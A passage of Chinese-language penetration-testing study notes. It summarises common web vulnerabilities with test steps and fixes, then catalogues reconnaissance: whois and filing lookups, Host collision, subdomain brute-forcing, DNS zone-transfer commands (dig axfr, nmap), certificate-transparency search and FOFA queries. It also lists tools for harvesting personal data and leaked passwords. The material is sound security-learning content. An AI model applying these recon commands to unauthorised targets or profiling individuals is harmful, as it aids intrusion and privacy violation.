② 使用非常规路径（如对md5加密）
```



#### 信息泄露漏洞

**漏洞描述**
① 备份信息泄露：目标网站未及时删除编辑器或者人员在编辑文件时，产生的临时文件，或者相关备份信息未及时删除导致信息泄露。
② 测试页面信息泄露：测试界面未及时删除，导致测试界面暴露，被他人访问。
③ 源码信息泄露：目标网站文件访问控制设置不当，WEB服务器开启源码下载功能，允许用户访问网站源码。
④ 错误信息泄露：目标网站WEB程序和服务器未屏蔽错误信息回显，页面含有CGI处理错误的代码级别的详细信息，例如SQL语句执行错误原因，PHP的错误行数等。
⑤ 接口信息泄露：目标网站接口访问控制不严，导致网站内部敏感信息泄露。

**渗透测试**
**① 备份信息泄露、测试页面信息泄露、源码信息泄露，测试方法：使用字典，爆破相关目录，看是否存在相关敏感文件**
**② 错误信息泄露，测试方法：发送畸形的数据报文、非正常的报文进行探测，看是否对错误参数处理妥当。**
**③ 接口信息泄露漏洞，测试方法：使用爬虫或者扫描器爬取获取接口相关信息，看目标网站对接口权限是否合理**

风险评级：一般为中风险，如果源码大量泄漏或大量客户敏感信息泄露。

**安全建议**

```
① 备份信息泄露漏洞：删除相关备份信息，做好权限控制
② 测试页面信息泄露漏洞：删除相关测试界面，做好权限控制
③ 源码信息泄露漏洞：做好权限控制
④ 错误信息泄露漏洞：将错误信息对用户透明化，在CGI处理错误后可以返回友好的提示语以及返回码。但是不可以提示用户出错的代码级别的详细原因
⑤ 接口信息泄露漏洞：对接口访问权限严格控制
```



#### 失效的身份认证

**漏洞描述**
通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌， 或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。

**渗透测试**
**① 在登陆前后观察，前端提交信息中，随机变化的数据，总有与当前已登陆用户进行绑定的会话唯一标识，常见如cookie**
**② 一般现在网站没有那种简单可破解的标识，但是如果是跨站认证，单点登录场景中，可能为了开发方便而简化了身份认证**

风险评级：高风险

**安全建议**

```
① 使用强身份识别，不使用简单弱加密方式进行身份识别；
② 服务器端使用安全的会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储，在登出、闲置超时后使其失效。
```



#### 失效的访问控制

**漏洞描述**
未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。

**渗透测试**
**① 登入后，通过burpsuite 抓取相关url 链接，获取到url 链接之后，在另一个浏览器打开相关链接，看能够通过另一个未登入的浏览器直接访问该功能点。**
**② 使用A用户登陆，然后在另一个浏览器使用B用户登陆，使用B访问A独有的功能，看能否访问。**

风险评级：高风险

**安全建议**

```
① 除公有资源外，默认情况下拒绝访问非本人所有的私有资源；
② 对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害；
③ 当用户注销后，服务器上的Cookie，JWT等令牌应失效；
④ 对每一个业务请求，都进行权限校验。
```



#### 安全配置错误

**漏洞描述**
应用程序缺少适当的安全加固，或者云服务的权限配置错误。
① 应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。
② 默认帐户的密码仍然可用且没有更改。
③ 错误处理机制向用户披露堆栈跟踪或其他大量错误信息。
④ 对于更新的系统，禁用或不安全地配置最新的安全功能。
⑤ 应用程序服务器、应用程序框架（如：Struts、Spring、ASP.NET）、库文件、数据库等没有进行相关安全配置。

**渗透测试**
**先对应用指纹等进行信息搜集，然后针对搜集的信息，看相关应用默认配置是否有更改，是否有加固过；端口开放情况，是否开放了多余的端口；**

风险评级：中风险

**安全建议**

```
搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例。移除或不安装不适用的功能和框架。在所有环境中按照标准的加固流程进行正确安全配置。
```



#### 使用含有已知漏洞组件

**漏洞描述**
使用了不再支持或者过时的组件。这包括：OS、Web服务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、API和所有的组件、运行环境和库。

**渗透测试**
**① 根据前期信息搜集的信息，查看相关组件的版本，看是否使用了不在支持或者过时的组件。一般来说，信息搜集，可通过http返回头、相关错误信息、应用指纹、端口探测（Nmap）等手段搜集。**
**② Nmap等工具也可以用于获取操作系统版本信息**
**③ 通过CVE，CNVD等平台可以获取当前组件版本是否存在漏洞**

风险评级：按照存在漏洞的组件的安全风险值判定当前风险。

**安全建议**

```
① 移除不使用的依赖、不需要的功能、组件、文件和文档；
② 仅从官方渠道安全的获取组件(尽量保证是最新版本)，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险；
③ 监控那些不再维护或者不发布安全补丁的库和组件。如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。
```

# 7.18

学习文章：

```
https://forum.butian.net/share/1976
```

## 外网信息搜集

### 工具

```
工具、网站	备注
1、爱站、站长工具	
Whois、备案号、权重、公司名称等

2、天眼查、企查查、搜狗搜索引擎	
公司注册域名、微信公众号、APP、软件著作权等

3、ZoomEye、Shodan、FOFA、0.Zone、quake	
网络空间资产搜索引擎

4、ENScanGo、ICP备案	
主域名收集

5、OneForAll、Layer、Rapid7的开源数据项目、ctfr、EyeWitness	
子域名收集

6、Kscan、ShuiZe_0x727、ARL灯塔、Goby	
自动化、批量信息收集

7、Bufferfly、Ehole	
资产处理、信息筛选

8、dnsdb、CloudFlair	
CDN相关

9、VirusTotal、微步、ip2domain	C段、
域名/ip情报信息

10、Nmap、Masscan	
端口服务信息

11、Google Hacking、dirsearch、URLFinder	
WEB站点信息、api接口等

12、wafw00f	
waf识别

13、云悉、潮汐、WhatWeb	
在线CMS识别

14、七麦、小蓝本	
APP资产

15、ApkAnalyser	
App敏感信息

16、乌云漏洞库、CNVD、waybackurls	
历史漏洞、历史资产等

17、n0tr00t/Sreg、reg007	
个人隐私信息

18、GitDorker	
资产信息、源码泄露

19、theHarvester、Snov.io	
邮箱信息收集

20、OSINT开源情报和侦擦工具	
开源情报资源导航

21、anti-honeypot、Honeypot Hunter	
蜜罐识别
```

#### 主域名信息

```
域名用来代替IP使其更容易被用户找到、记住。

对于"非用户"来说，可通过域名信息获取：主域名、存活站点、关联信息、钓鱼信息。为漏洞挖掘提供数据支撑。
```

##### ICP备案

**国内服务器线上运营都必须先办理ICP备案后才能上线。**

<img src="image/image-20240717145857053-17212720446854.png" alt="image-20240717145857053" style="zoom: 50%;" />

##### 01备案信息查询：

###### 01、**ICP备案查询**

```
https://beian.miit.gov.cn/#/Integrated/index
```

###### ![image-20240717150007205](image/image-20240717150007205-17212720446859.png)02、**公安部备案查询**

<img src="image/image-20240717150605200-17212720446855.png" alt="image-20240717150605200" style="zoom:80%;" />

###### 03、**备案反查主域名**

反查可分为备案域名查询和未备案域名查询。

**备案域名查询**

第三方站点

```
ICP备案查询-站长工具
SEO综合查询
```

<img src="image/image-20240717151122094-17212720446856.png" alt="image-20240717151122094" style="zoom:80%;" />

```
- 公安部备案查询
- 企业信息查询网站
```

**未备案域名查询**

已知网站信息获取（如，网站站点导航可能会包含未备案的站点）

![image-20240717151627155](image/image-20240717151627155-17212720446857.png)

网络空间引擎进行证书、图标关联搜索。例如：fofa指定搜索规则 `is_domain=true`，即表示只返回域名*(个人感觉国外shodan、国内fofa)*。

![image-20240717152242384](image/image-20240717152242384-17212720446858.png)

##### 02whois（注册人

通过whois信息可以获取注册人的关键信息。如注册商、联系人、联系邮箱、联系电话，也可以对注册人、邮箱、电话反查域名，也可以通过搜索引擎进一步挖掘域名所有人的信息。深入可社工、可漏洞挖掘利用。

**站长之家**

```
http://whois.chinaz.com/
```

<img src="image/image-20240717152356105-172127204468510.png" alt="image-20240717152356105" style="zoom:80%;" />

```
Bugscanner
http://whois.bugscaner.com

国外BGP
https://bgp.he.net

who.is
https://who.is/

IP138网站
https://site.ip138.com/

域名信息查询-腾讯云
https://whois.cloud.tencent.com/

ICANN LOOKUP
https://lookup.icann.org/

狗狗查询
https://www.ggcx.com/main/integrated
```

<img src="image/image-20240717152516109-172127204468511.png" alt="image-20240717152516109" style="zoom:80%;" />

```
ps:

部分whois查询存在隐藏信息，可以在其他站点查询。
whois主要还是注册商、注册人、邮件、DNS 解析服务器、注册人联系电话。
由于GDRP，ICANN要求所有域名注册商必须对域名whois隐私信息进行保护，所以whois信息越来越少……但还是会存在一些whois域名系统是旧缓存数据。
```

##### 03ip反查（一ip其他域名

```
ps:

目标可能存在多个域名绑定于同一ip上，通过ip反查可以获取到其他域名信息。比如旁站。

通过获取目标真实IP后，进行反查的旁站更真实。
查询站点需复杂性，单一的站点会有反查不出信息的可能。

大型企业不同的站点收录可能不一样
个人推荐3个不同站点反查
```

**如何查询**

**在线查询网站**：

```
同IP网站查询，同服务器网站查询 - 站长工具
Dnslytics
iP或域名查询
```

- [同IP网站查询，同服务器网站查询 - 站长工具](http://s.tool.chinaz.com/same)
- [Dnslytics](https://dnslytics.com/)
- [iP或域名查询](https://site.ip138.com/)

<img src="image/image-20240717152710668-172127204468512.png" alt="image-20240717152710668" style="zoom:80%;" />

**搜索引擎**：

- shodan
- bing
- fofa

##### 04HOST碰撞（域名ip捆绑碰撞

信息收集过程中，往往会因为配置错误或是未及时回收等原因，存在一些隐形资产。直接访问的话会出现访问限制的问题，如下：

**ip访问响应多为：nginx、4xx、500、503、各种意义不明的Route json提示等**

<img src="image/image-20240717153552201-172127204468613.png" alt="image-20240717153552201" style="zoom:80%;" />

<img src="image/image-20240717153555019-172127204468615.png" alt="image-20240717153555019" style="zoom:80%;" />

```
域名解析后到内网地址

有服务器真实 IP，但找不到内网域名。
```

究其原因，大多数是因为中间件对ip访问做限制，不能通过ip直接访问，必须使用域名进行访问。如果域名解析记录里也找不到域名记录，这时就可以用到HOST碰撞技术，**通过将域名和IP进行捆绑碰撞**，一旦匹配到后端代理服务器上的域名绑定配置，就可以访问到对应的业务系统，从而发现隐形资产。

**手法：**

使用收集到的目标IP、爬虫或自定义的内部域名（内网host池），作为字典，通过脚本进行碰撞，脚本会自动模拟绑定ip与host进行请求交互，通过标题或响应大小判断结果。只要字典够强大，总能出一两个，爆破时最好也试下TLS，部分主机会使用TLS的。

验证结果，只需修改本机`host文件`绑定host与ip后，看访问变化。

**自动化**：

```
灯塔
水泽
https://github.com/cckuailong/hostscan
https://github.com/fofapro/Hosts_scan
https://github.com/smxiazi/host_scan
```

- [灯塔](https://github.com/TophantTechnology/ARL)
- [水泽](https://github.com/0x727/ShuiZe_0x727)
- https://github.com/cckuailong/hostscan
- https://github.com/fofapro/Hosts_scan
- https://github.com/smxiazi/host_scan

<img src="image/image-20240717154256057-172127204468614.png" alt="image-20240717154256057" style="zoom:80%;" />

##### 05DNS共享记录（自建dns

**关于DNS**

DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名，即保存了**IP地址**和**域名**的相互映射关系。域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。也正是因为DNS的存在，访问相应服务只需记住域名，不需要记住无规则的ip地址。

- DNS服务器端口: tcp/udp 53。
- 常用DNS记录：

| 记录类型   | 说明                                                         |
| :--------- | :----------------------------------------------------------- |
| A 记录     | 将域名指向一个 IP 地址（外网地址）。                         |
| CNAME 记录 | 将域名指向另一个域名，再由另一个域名提供 IP 地址（外网地址）。 |
| MX 记录    | 电子邮件交换记录，记录一个邮件域名对应的IP地址，设置邮箱，让邮箱能收到邮件。 |
| NS 记录    | 域名服务器记录，记录该域名由哪台域名服务器解析。如将子域名交给其他 DNS 服务商解析。 |
| AAAA 记录  | 将域名指向一个 IPv6 地址。                                   |
| SRV 记录   | 用来标识某台服务器使用了某个服务，常见于微软系统的目录管理。 |
| TXT 记录   | 对域名进行标识和说明，绝大多数的 TXT 记录是用来做 SPF 记录（反垃圾邮件）。 |

**利用价值**

可以通过查询共享DNS服务器的主机来获取到相关的域名，一般多是用于自建DNS服务器。如果是公开的DNS服务器，那么查询的效果将会特别差。

**手法**

- 查询目标是否存在自建的NS服务器

```bash
nslookup -query=ns baidu.com 8.8.8.8
```

<img src="image/image-20240717155317292-172127204468616.png" alt="image-20240717155317292" style="zoom: 50%;" />

- 将获取到的NS服务器带入 **https://hackertarget.com/find-shared-dns-servers/** 进行查询

<img src="image/image-20240717155440690-172127204468617.png" alt="image-20240717155440690" style="zoom:67%;" />

##### 06Google

**直接搜索目标相关关键内容来查询**，比如公司名、备案、引用的特殊js等。

搜索引擎很多，这里以Google为例：

<img src="image/image-20240718093853281-172127204468618.png" alt="image-20240718093853281" style="zoom:80%;" />

##### 07配置信息

由于信息泄露问题，某些配置或文件会存储一些目标相关的域名，如子域名、代码托管平台等，一般来说存储信息有限且不应公网存在此类文件。

**策略文件域名信息问题如：**

- crossdomain.xml文件
  - 通常域名直接拼接crossdomain.xml路径

<img src="image/image-20240718095013596-172127204468619.png" alt="image-20240718095013596" style="zoom:80%;" />

**sitemap文件**

站点地图文件，常见如：

- sitemap.xml、sitemap.txt、sitemap.html、sitemapindex.xml、sitemapindex.xml路径

<img src="image/image-20240718100341224-172127204468620.png" alt="image-20240718100341224" style="zoom:80%;" />

**策略配置方面如**：

- 内容安全策略（CSP，Content Security Policy)

这是一种声明的安全机制，可以让网站运营者能够控制遵循CSP的用户代理（通常是浏览器）的行为。通过控制要启用哪些功能，以及从哪里下载内容，可以减少网站的攻击面。CSP的主要目的是防御跨站点脚本（cross-ste scripting，XSS）攻击。例如，CSP可以完全禁止内联的JavaScript，并且控制外部代码从哪里加载。它也可以禁止动态代码执行。禁用了所有的攻击源，XSS攻击变得更加困难。CSP中的关键字有default-src、img-src、object-src和script-src。其中*-src可能会存在域名信息。

关键点：

HTTP header的`Content-Security-Policy`属性

<img src="image/image-20240718100537946-172127204468621.png" alt="image-20240718100537946" style="zoom:80%;" />

##### 08众测

补天、漏洞银行、先知、hackerone等众测的广商提供的域名测试范围。

比如hackerone：alibaba

<img src="image/image-20240718100711935-172127204468622.png" alt="image-20240718100711935" style="zoom: 80%;" />

##### 09企业资产信息

通过企业名称拓展查询目标企业的组织架构、股权信息、股权穿透图、子公司、孙公司、对外投资50%等目标信息，获取其产品业务、域名、邮箱资产范围等，扩大攻击面。大概企业资产收集点如下：

企业数据：

```
邮箱收集
邮箱查询：https://hunter.io/

企业架构画像

直属单位、机构设置、供应商*（相关合同、人员、系统、软件等）*、合作商等

业务信息：证券、快递、专用网、院校等


```

人员数据，如统计、职责、部门、人员历史泄露密码、浏览习性等

设备信息：

```
- WiFi
- 常用密码、部门设备信息
- OA/erp/crm/sso/mail/vpn等入口
- 网络安全设备（waf,ips,ids,router等统计）
- 内部使用的代码托管平台(gitlab、daocloud等)、bug管理平台、监控平台等
- 服务器域名资产
- site:xxx
```

###### **01股权投资信息**

一般要求50%持股或者100% 持股都可以算测试目标。

天眼查：

```
https://www.tianyancha.com/
```

<img src="image/image-20240719093628282.png" alt="image-20240719093628282" style="zoom:80%;" />

<img src="image/image-20240719093646978.png" alt="image-20240719093646978" style="zoom:80%;" />

企查查

```
https://www.qcc.com/
```

钉钉企典

```
https://www.dingtalk.com/qidian/home?spm=a213l2.13146415.4929779444.89.7f157166W6H4YZ
```

###### **02公众号信息**

**搜狗搜索引擎**

https://wx.sogou.com/

<img src="image/image-20240719093955770.png" alt="image-20240719093955770" style="zoom:80%;" />

企查查

https://www.qcc.com/

<img src="image/image-20240719094704970.png" alt="image-20240719094704970" style="zoom:80%;" />

```
微信app

支付宝app
```

###### **03应用信息**

天眼查

https://www.tianyancha.com/

<img src="image/image-20240719094927231.png" alt="image-20240719094927231" style="zoom:80%;" />

七麦数据

https://www.qimai.cn/

<img src="image/image-20240719095107972.png" alt="image-20240719095107972" style="zoom:80%;" />

企查查

https://www.qcc.com/

小蓝本

https://www.xiaolanben.com/pc

<img src="image/image-20240719095147078.png" alt="image-20240719095147078" style="zoom:80%;" />

点点数据

https://app.diandian.com/

<img src="image/image-20240719095238514.png" alt="image-20240719095238514" style="zoom:80%;" />

豌豆荚

https://www.wandoujia.com/

方便获取APP历史版本

![image-20240719095250538](image/image-20240719095250538.png)

###### **04关于工具**

https://github.com/wgpsec/ENScan_GO

由狼组安全团队的 Keac 师傅写的专门用来解决企业信息收集难的问题的工具，可以一键收集目标及其控股公司的 ICP 备案、APP、小程序、微信公众号等信息然后聚合导出。

# 7.19

#### 子域名信息

子域名一般是父级域名的下一级。一般企业主站域名的防护都是重点，安全级别较高，突破难度较大，而企业可能会有数十个甚至更多的子域名应用，因为数量众多，安全因素和成本投入多，相应的防护也没有那么及时有效。子域名往往是攻击突破口，通过子域名发现更多的可能性或是进行迂回攻击。

**子域名信息点：**

子域名包含一些常见资产类型：办公系统，邮箱系统，论坛，商城等。而其他管理系统，网站管理后台等较少出现在子域名中。

一般情况下，相同类型漏洞可能存在同一组织的不同的域名/应用程序中。

子域名系统维护成本、用户群体等，一般少于主域名，会存在一些版本迭代、配置不安全、弱密码账号管理策略等。

子域名探测发现更多的服务，增加漏洞发现的可能性。

##### 01枚举爆破

手法介绍

要说简单粗暴还是子域名枚举爆破，通过不断的拼接`字典`中的子域名前缀去枚举域名的A记录进行`DNS解析`，如果成功解析说明子域名存在。如xxx.com拼接前缀test组合成test.xxx.com，再对其进行验证。但是域名如果使用`泛解析`的话，则会导致所有的域名都能成功解析，使得子域名枚举变得不精准。

`nslookup`验证下~

- 泛解析域名，成功解析不存在的域名。

<img src="image/image-20240719103825835.png" alt="image-20240719103825835" style="zoom: 50%;" />

- 普通解析，不存在的域名解析会失败。

<img src="image/image-20240719103902854.png" alt="image-20240719103902854" style="zoom:50%;" />

```
泛解析：使用通配符 * 来匹配所有的子域名，从而实现所有的子级域名均指向相同网站空间。

会存在域名劫持、域名恶意泛解析风险

会主站被降权，可能被恶意利用，占用大量流量

关于恶意解析：

https://cloud.tencent.com/developer/article/1494534?from=article.detail.1874625

混合泛解析：在泛解析的基础上，增加一个限制，使记录可以按照需求进行分类。

https://cloud.tencent.com/document/product/302/9073

https://github.com/Q2h1Cg/dnsbrute/blob/v2.0/dict/53683.txt)
```

**关于泛解析**

那么域名使用了泛解析怎么去解决呢？

```
一般有两种：

黑名单ip：
通过获取一个不存在的子域名相应解析IP，来记录标记黑名单ip，再爆破字典时，解析到的IP在这个黑名单ip中，则跳过，不存在就继续处理。
或是记录相同的，保留一到两个。

TTL
在权威 DNS 中，泛解析记录的 TTL 肯定是相同的，如果子域名记录相同，但 TTL 不同，那这条记录可以说肯定不是泛解析记录。

响应内容
牺牲速度，先获取一个绝对不存在域名的响应内容，再遍历获取每个字典对应的子域名的响应内容，通过和不存在域名的内容做相似度比对，来枚举子域名。
```

**枚举爆破常用工具**

在线查询：

- https://phpinfo.me/domain/
  - 速度不错
- https://chaziyu.com/
  - 子域、备案都可以查

其他：

- [Layer 子域名挖掘机](https://github.com/euphrat1ca/LayerDomainFinder)

  - 可视化，取决于字典强度，易上手，就是容易崩溃

- [subDomainsBrute](https://github.com/lijiejie/subDomainsBrute)

  - 老牌DNS爆破工具，稳定快速~
  - 暂不支持批量
  - **怼泛解析**：超过10个域名指向同一IP，则此后发现的其他指向该IP的域名将被丢弃，该方法可能存在误删，但简单有效。

- [OneForAll](https://github.com/shmilylty/OneForAll)

  - 收集姿势挺全的，就是依赖多，一直再更新
  - OneForALL + ESD + JSfinder~~
  - **怼泛解析**：oneforall会首先访问一个随机的并不存在的域，通过返回结果判断是否存在泛解析，确定存在泛解析以后，程序会开始不断的循环产生随机域名，去向服务器查询，将每次查询到的IP和TTL记录下来，直到大部分的IP地址出现次数都大于两次，则IP黑名单的收集结束，在得到了IP黑名单以后，oneforall接下来会将自己的字典中的每一项和要指定查询的域名进行拼接。在爆破过程中根据IP黑名单进行过滤。但这种宽泛的过滤容易导致漏报，所以oneforall将 TTL 也作为黑名单规则的一部分，评判的依据是：在权威 DNS 中，泛解析记录的 TTL 肯定是相同的，如果子域名记录相同，但 TTL 不同，那这条记录可以说肯定不是泛解析记录。

- [knock](https://github.com/guelfoweb/knock)

  - 支持查询VirusTotal，速度快，结果一般
  - VirusTotal API绕过泛解析

- [ESD](https://github.com/FeeiCN/ESD)

  - 收集方法多，爆破速度极快，接口少
  - **怼泛解析**：基于文本相似度过滤泛解析域名

- [**ksubdomain**](https://github.com/boy-hack/ksubdomain)

  - 无状态的子域名爆破工具,支持重放，速度不错
  - 结合其他工具，一键子域名搜集验证：

  https://cn-sec.com/archives/1178685.html

- [xray 高级版](https://github.com/chaitin/xray/releases)

  - 效率可以，联动很舒服

<img src="image/image-20240719105221779.png" alt="image-20240719105221779" style="zoom:67%;" />

**关于字典**

```
字典这块引用下https://feei.cn/esd/
```

**DNS服务商的字典**一般来说最准确有效，如：DNSPod公布的使用最多的子域名：[dnspod-top2000-sub-domains.txt](https://github.com/DNSPod/oh-my-free-data/blob/master/src/dnspod-top2000-sub-domains.txt)

**普通字典**：一些基础组合。

- 单字母：f.feei.cn（大都喜欢短一点的域名，单字符的最为常见）
- 单字母+单数字：s1.feei.cn
- 双字母：sd.feei.cn（大都喜欢业务的首字母缩写）
- 双字母+单数字：ss1.feei.cn
- 双字母+双数字：ss01.feei.cn
- 三字母：[www.feei.cn](https://forum.butian.net/share/www.feei.cn)（部分业务名称为三个字）
- 四字母：webp.feei.cn（部分业务名称为四个字）
- 单数字：1.feei.cn
- 双数字：11.feei.cn
- 三数字：666.feei.cn

**常用词组**：常见的中英文词组。

- fanyi.feei.cn（中）tranlate.feei.cn（英）
- huiyuan.feei.cn（中）member.feei.cn（英）
- tupian.feei.cn（中）picture.feei.cn（英）

**爆破工具的字典**: 可结合整理过的字典

- [subbrute](https://github.com/TheRook/subbrute): [names_small.txt](https://github.com/TheRook/subbrute/blob/master/names_small.txt)
- [subDomainsBrute](https://github.com/lijiejie/subDomainsBrute): [subnames_full.txt](https://github.com/lijiejie/subDomainsBrute/blob/master/dict/subnames_full.txt)
- [dnsbrute](https://github.com/Q2h1Cg/dnsbrute): [53683.txt](https://github.com/Q2h1Cg/dnsbrute/blob/v2.0/dict/53683.txt)

##### 02DNS传送域

DNS服务器分为：主服务器、备份服务器和缓存服务器。

在主备服务器之间同步数据库，需要使用“DNS域传送”的一种DNS事务。**域传送**是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。

若DNS配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。

- 错误配置：只要收到`axfr`请求就进行域传送，刷新数据。

**检测方法：**

`axfr` 是q-type类型的一种，axfr类型是`Authoritative Transfer`的缩写，指请求传送某个区域的全部记录。只要欺骗dns服务器发送一个`axfr`请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值。

nslookup

```
# 查询nameserver  
nslookup -type=ns nhtc.wiki 8.8.8.8  
# 指定nameserver，列举域名信息  
nslookup  
# Server 命令参数设定查询将要使用的DNS服务器  
server cloudy.dnspod.net   
#  Ls命令列出某个域中的所有域名  
ls nhtc.wiki
```

<img src="image/image-20240719110809030.png" alt="image-20240719110809030" style="zoom:80%;" />

无法列出域，不存在此漏洞

**Dig**

```bash
# 找到NS服务器  
dig nhtc.wiki ns
```

<img src="image/image-20240719110938728.png" alt="image-20240719110938728" style="zoom: 67%;" />

```bash
# 发送axfr请求  
 dig axfr @cloudy.dnspod.net nhtc.wiki
```

![image-20240719110959502](image/image-20240719110959502.png)

**其他**

nmap：

```bash
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=nhtc.wiki -p 53 -Pn cloudy.dnspod.net
```

python

```bash
# DNS库  
xfr = dns.query.xfr(where=server, zone=self.domain, timeout=5.0, lifetime=10.0)  
zone = dns.zone.from\_xfr(xfr) 
```

一般情况下，DNS服务器配置都正常，关闭了域传送或设置白名单，利用率低。推荐交给自动化。

##### 03证书透明度收集子域

证书透明度（Certificate Transparency）是谷歌力推的一项拟在确保证书系统安全的透明审查技术。其目标是提供一个开放的审计和监控系统，可以让任何[域名](https://dnspod.cloud.tencent.com/)的所有者，确定CA证书是否被错误签发或恶意使用。TLS的缺点是你的浏览器隐性包含了一个大型受信任CA列表。如果任何这些CA恶意为域创建新证书，则你的浏览器都会信任它。CT为TLS证书信任提供了额外的安全保障：即公司可以监控谁为他们拥有的域创建了证书。此外，它还允许浏览器验证给定域的证书是否在公共日志记录中。

————————[Google 的证书透明度项目](https://www.certificate-transparency.org/)

因为证书透明性是开放架构，可以检测由证书颁发机构错误颁发的 SSL 证书，也可以识别恶意颁发证书的证书颁发机构，且任何人都可以构建或访问，CA证书又包含了`域名、子域名、邮箱`等敏感信息，价值就不言而喻了。

**收集方法：**

一般使用 CT 日志搜索引擎进行域名信息收集，因为是日志收集，只增不减，可能会有一些失效域名。

**在线查询：**

- [crtsh](https://crt.sh/)

![image-20240719111453119](image/image-20240719111453119.png)

- [entrust](https://www.entrust.com/ct-search/)
- [censys](https://censys.io/certificates)
- [facebook（需要登录）](https://developers.facebook.com/tools/ct/)
- [spyse](https://spyse.com/search/certificate)
- [certspotter（每小时免费查100次）](https://sslmate.com/certspotter/api/)

**浏览器查询**

点击浏览器网站小锁-->安全连接-->更多信息-->查看证书-->查看主题替代名称处，有时候会有主域名和子域名信息。

<img src="image/image-20240719111527859.png" alt="image-20240719111527859" style="zoom:67%;" />

<img src="image/image-20240719111541188.png" alt="image-20240719111541188" style="zoom:80%;" />

**工具：**

- [ctfr](https://github.com/UnaPibaGeek/ctfr)
- [OneForAll](https://github.com/shmilylty/OneForAll)

##### 04公开数据集

利用已有公开的全网扫描数据集，对子域名信息进行收集。

- [Rapid7的开源数据项目](https://opendata.rapid7.com/)
- [threatcrowd](https://www.threatcrowd.org/)

收集方法：

- [Find DNS Host Records (Subdomains) | hackertarget](https://hackertarget.com/find-dns-host-records/)
- [netcraft](https://searchdns.netcraft.com/)
- 命令进行快速查找

```bash
wget https://scans.io/data/rapid7/sonar.fdns\_v2/20170417-fdns.json.gz  
cat 20170417\-fdns.json.gz | pigz \-dc | grep ".target.org" | jq\`
```

##### 05第三方聚合服务

通过第三方平台提供的一些服务，快速发现子域名信息。

- [VirusTotal](https://www.virustotal.com/gui/home/search)

> VirusTotal会运行DNS复制功能，通过存储用户访问URL时执行的DNS解析来构建数据库。

<img src="image/image-20240719111637106.png" alt="image-20240719111637106" style="zoom:67%;" />

- [Find DNS Host Records | Subdomain Finder | HackerTarget.com](https://hackertarget.com/find-dns-host-records/)
- [netcraft](https://searchdns.netcraft.com/)
- [DNSdumpster.com](https://dnsdumpster.com/)
- [域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询](https://site.ip138.com/)
- [threatminer](https://www.threatminer.org/index.php)
- [Subdomain Finder](https://spyse.com/tools/subdomain-finder)
- [threatbook（需要高级权限）](https://x.threatbook.cn/)
- [子域名查询 - 站长工具（需要登录）](http://tool.chinaz.com/subdomain/?domain=)
- [namecheap](https://decoder.link/)
- 其他工具：
  - [Sublist3r](https://github.com/aboul3la/Sublist3r)
  - [OneForAll](https://github.com/shmilylty/OneForAll)

##### 06搜索引擎

**介绍**

搜索引擎是用于查找和排名与用户搜索匹配的 Web 内容的工具。

搜索引擎通过“蜘蛛”对全网进行大量爬行并处理后，建立索引*（索引是将抓取页面中的信息添加到叫做搜索索引的大型数据库中。）*。在此期间往往收集了大量的域名信息，需要对应的语法，即可从这数据库中获取想要的信息。

**搜索方法：**

**主流搜索引擎**

一份国外调查表：

<img src="image/image-20240719111746842.png" alt="image-20240719111746842" style="zoom:80%;" />

**Goolge：**

俗称Google Hacking 大法，有十几种语法，混合使用可以更加准确地查找信息。

- Google检索技巧大全: [https://sites.google.com/site/hopeanwang/google%E6%A3%80%E7%B4%A2%E6%8A%80%E5%B7%A7%E5%A4%A7%E5%85%A8](https://sites.google.com/site/hopeanwang/google检索技巧大全)

**搜索子域名信息**

```php
site:360.cn
```

<img src="image/image-20240719111838198.png" alt="image-20240719111838198" style="zoom:67%;" />

**搜索一个域名后台信息**

```php
site:xx.com inurl:id=1  intext:后台 
```

<img src="image/image-20240719111859430.png" alt="image-20240719111859430" style="zoom:80%;" />

**网络空间引擎**

[fofa](https://fofa.info/)

FOFA是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行[漏洞](https://www.77169.net/ld)影响范围分析、应用分布统计、应用流行度排名统计等。

| 逻辑连接符 | 具体含义                                      |
| :--------- | :-------------------------------------------- |
| \=         | 匹配，=""时，可查询不存在字段或者值为空的情况 |
| \=\=       | 完全匹配，==""时，可查询存在且值为空的情况    |
| &&         | 与                                            |
| \|         | 或者                                          |
| !\=        | 不匹配，!\=""时，可查询值为空的情况           |
| ~\=        | 正则语法匹配专用（高级会员独有，不支持body）  |
| ()         | 确认查询优先级，括号内容优先级最高            |

目前FOFA支持了多个网络组件的指纹识别，包括建站模块、分享模块、各种开发框架、安全监测平台、项目管理系统、企业管理系统、视频监控系统、站长平台、电商系统、广告联盟、前端库、路由器、SSL证书、服务器管理系统、CDN、Web服务器、WAF、CMS等等，详细信息见https://fofa.info/library

**常用语法可通过”查询语法“功能获取：**

https://fofa.info/

例句(点击可去搜索)用途说明注

| 例句(点击可去搜索)                                           | 用途说明                                           | 注                                                    |
| :----------------------------------------------------------- | :------------------------------------------------- | :---------------------------------------------------- |
